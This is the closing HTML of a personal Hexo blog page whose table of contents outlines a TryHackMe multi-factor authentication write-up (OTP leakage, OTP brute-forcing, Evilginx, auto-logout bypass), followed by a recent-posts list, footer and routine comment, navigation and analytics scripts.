class="toc-number">3.0.2.</span> <span class="toc-text">应用程序泄露双重身份验证令牌</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B8%80%E6%AC%A1%E6%80%A7%E5%AF%86%E7%A0%81-OTP"><span class="toc-number">3.0.3.</span> <span class="toc-text">暴力破解一次性密码 (OTP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Evilginx-%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">3.0.4.</span> <span class="toc-text">Evilginx 的使用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Practical-OTP-Leakage"><span class="toc-number">4.</span> <span class="toc-text">Practical - OTP Leakage</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OTP-%E6%B3%84%E6%BC%8F"><span class="toc-number">4.0.1.</span> <span class="toc-text">OTP 泄漏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.0.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Practical-Insecure-Coding"><span class="toc-number">5.</span> <span class="toc-text">Practical - Insecure Coding</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E7%BC%BA%E9%99%B7%E8%BF%98%E6%98%AF%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E7%BC%96%E7%A0%81%EF%BC%9F"><span class="toc-number">5.0.1.</span> <span class="toc-text">逻辑缺陷还是不安全的编码？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">5.0.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E4%BB%A3%E7%A0%81"><span class="toc-number">5.0.3.</span> <span class="toc-text">深入代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Practical-Beating-the-Auto-Logout-Feature"><span class="toc-number">6.</span> <span class="toc-text">Practical - Beating the Auto-Logout Feature</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E8%87%B4%E6%AD%A4%E8%A1%8C%E4%B8%BA%E7%9A%84%E5%B8%B8%E8%A7%81%E5%8E%9F%E5%9B%A0"><span class="toc-number">6.0.1.</span> <span class="toc-text">导致此行为的常见原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E6%98%AF%E5%85%B3%E9%94%AE"><span class="toc-number">6.0.2.</span> <span class="toc-text">自动化是关键</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="toc-number">6.0.3.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">7.</span> <span class="toc-text">Conclusion</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%A6%81%E7%82%B9"><span class="toc-number">7.0.1.</span> <span class="toc-text">关键要点</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/03/THMMulti-FactorAuthentication/" title="THMMulti-FactorAuthentication">THMMulti-FactorAuthentication</a><time datetime="2025-06-03T08:56:58.000Z" title="发表于 2025-06-03 16:56:58">2025-06-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/03/THMOAuthVulnerabilities/" title="THMOAuthVulnerabilities">THMOAuthVulnerabilities</a><time datetime="2025-06-03T04:32:26.000Z" title="发表于 2025-06-03 12:32:26">2025-06-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/26/APP%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE(Charles+%E9%9B%B7%E7%94%B5%E6%A8%A1%E6%8B%9F%E5%99%A8)/" title="APP渗透测试环境配置(Charles+雷电模拟器)">APP渗透测试环境配置(Charles+雷电模拟器)</a><time datetime="2025-05-26T01:37:22.270Z" title="发表于 2025-05-26 09:37:22">2025-05-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/26/25-4%E6%9D%82%E8%B0%88/" title="25-4杂谈">25-4杂谈</a><time datetime="2025-05-26T01:30:23.000Z" title="发表于 2025-05-26 09:30:23">2025-05-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/24/CVE-2021-44228Log4j%E5%A4%8D%E7%8E%B0/" title="CVE-2021-44228Log4j复现">CVE-2021-44228Log4j复现</a><time datetime="2025-04-24T11:44:27.000Z" title="发表于 2025-04-24 19:44:27">2025-04-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'https://blog.mikannse.cn/2025/06/03/THMMulti-FactorAuthentication/'
+    this.page.identifier = '/2025/06/03/THMMulti-FactorAuthentication/'
+    this.page.title = 'THMMulti-FactorAuthentication'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
